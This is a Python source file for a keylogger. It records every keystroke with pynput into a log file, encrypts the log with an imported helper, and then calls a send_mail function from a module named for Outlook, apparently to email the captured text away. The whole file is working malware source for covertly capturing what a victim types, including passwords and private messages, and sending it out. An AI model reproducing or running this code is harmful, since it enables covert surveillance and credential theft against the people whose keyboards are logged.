from sendoutlook import send_mail
from pynput.keyboard import Listener, Key
from decrypt import decrypt                                          
from encrypt import encrypt

decrypt()                                                           #called to make sure file is decrypted b4 encryption

count = 0

def on_press(key):
    global count
    letter = str(key)
    letter = letter.replace("'","") 
    special_keys(letter)
    count += 1
    if count == 10000000:
        return False

def special_keys(letter):
    if letter == "Key.space":
        letter = " "

    if letter == "Key.enter":
        letter = "\n"

    if letter.find("Key") == -1:
        with open("log.txt","a") as f:
            f.write(letter)
        
   

def on_release(key):
    if key == Key.esc:
        f = open("log.txt","a")
        f.write("\n")
        return False
        

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()


encrypt()                                       #Encrypting the logfile from encrypt script

try:
    if __name__ =="__main__":

        print("Sending mail...")
        
        send_mail()

except Exception as exception:
    
    print(exception)